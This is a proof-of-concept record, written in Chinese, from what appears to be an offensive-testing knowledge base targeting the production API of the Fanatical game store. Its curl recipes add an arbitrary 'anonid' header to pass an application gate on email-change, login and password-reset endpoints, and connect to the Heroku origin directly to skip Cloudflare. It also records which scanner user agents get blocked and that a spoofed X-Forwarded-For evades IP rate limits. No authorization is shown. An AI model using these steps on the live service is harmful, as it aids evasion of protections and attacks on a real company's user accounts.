# Fanatical API 403 15B "Request blocked" = 应用层缺 anonid 头（非 WAF/非 UA），加任意 anonid 即过

- **code**: fanatical-api-403-15b-request-blocked-应用层缺-anonid-头-非-wa
- **kind**: poc
- **category**: protocol
- **component**: Fanatical API（Cloudflare Worker 前置 + Heroku/Express 源站）
- **severity**: low
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-12 12:28-12:40Z 实测（curl，UA=$ARTEX_UA）：POST /api/user/new-change-email 带生产会话但**不**带 anonid → HTTP 403 LEN15 "Request blocked"（边缘 server:cloudflare/x-is-cf-worker:1，源站 server:Heroku，两者 etag 同为 W/"f-UXf18JKI7XLlqSi603hG/THqJ6I"）；同请求仅加 -H "anonid: <任意值>"（连 not-a-uuid 都行）→ 429/400 Invalid ReCaptcha。www 边缘 + ws15/apiprelive 源站各复现 2 次；login/password-reset 无 anonid 同样 403 LEN15、加则 429；set-language/refresh-auth 无 anonid 仍 200（按路径子集）。
- **path**: pocs/fanatical-api-403-15b-request-blocked-应用层缺-anonid-头-非-wa/poc.txt
- **tags**: fanatical, anonid, 403, request-blocked, heroku, cloudflare-worker, header-gate, false-waf, api-gateway
- **created_at**: 2026-11-12T12:39:24.892Z
- **engine**: https://www.fanatical.com （同构：ws15.fanatical.com / apiprelive.fanatical.com / apitesting.fanatical.com 源站）

## 描述

纠正历史误判（KB#547 及 fact#3979）：Fanatical API 的 15 字节 403 "Request blocked" 不是 Cloudflare 的爬虫拦截、也不是端点级 WAF，而是应用层中间件对 anonid 请求头的“存在性”检查（不校验值）。凡看到该 403，先补 anonid 头再谈绕过。

## 正文

```
# 判据
- 403 body 恰为 15 字节 "Request blocked"，响应头带 etag W/"f-..."（f=长度十六进制）、via: 2.0 heroku-router，且 Heroku 源站直连（--resolve GA IP + Host: <自定义域> + 任意 X-Forwarded-Host）返回完全相同的 body/etag ⇒ 生成者是应用（Express），Cloudflare/Worker 只是透传。
- 加 `anonid: <任意字符串>` 即消失（not-a-uuid 也放行 ⇒ 只查存在，不查 UUID）；换成 X-Fan-Client-Version 无效 ⇒ 门就是 anonid。
- 未认证端点（/api/auth/login、/api/password/reset、/api/auth/magic/summon）同样受此门（403/400 + 同一 15B 体）。
- 并非全站：/api/user/set-language、GET /api/user/refresh-auth 无 anonid 也 200 ⇒ 按路径子集生效（new-change-email、save-dob、login、reset、summon 在列）。

# 复现
```
TOK=<会话 token>
BODY='{"new_email":"a@b.co","old_email":"me@x.co","username":"me@x.co","recaptcha":"x"}'
# 1) 无 anonid -> 403 15B
curl -sk -A "$ARTEX_UA" -H "Authorization: $TOK" -H 'Content-Type: application/json' -X POST -d "$BODY" \
  https://www.fanatical.com/api/user/new-change-email
# 2) 加任意 anonid -> 过门（随后 429 或 400 Invalid ReCaptcha）
curl -sk -A "$ARTEX_UA" -H "Authorization: $TOK" -H "anonid: not-a-uuid" -H 'Content-Type: application/json' -X POST -d "$BODY" \
  https://www.fanatical.com/api/user/new-change-email
# 3) 源站直连同法（--noproxy '*' 必需）
curl -sk --noproxy '*' --resolve ws15.fanatical.com:443:3.33.161.45 \
  -H 'Host: ws15.fanatical.com' -H 'X-Forwarded-Host: www.fanatical.com' \
  -H "Authorization: $TOK" -H 'Content-Type: application/json' -X POST -d "$BODY" \
  https://ws15.fanatical.com/api/user/new-change-email
```
# 其它已确认的层（判拦截层用）
- CF 原生拦：sqlmap UA → 403 17B "error code: 1010"；nikto UA → 403 HTML 4549B "Attention Required!"；curl/python/wget/空 UA 目前 200（KB#547 的 curl-UA 被 403 已不成立）。
- CF 托管规则会拦 X-Original-URL / X-Rewrite-URL（403 HTML 4549B），Heroku 源站可穿但 Express 不识别。
- new-change-email 的 429 按“已认证用户”键控（换出口 IP、伪造 X-Forwarded-For 均无效，三通道共享），窗口 ≥8min、约 2 次/窗口；login/password-reset 的 429 是 IP 级（#3969 证 XFF 可绕）。

```
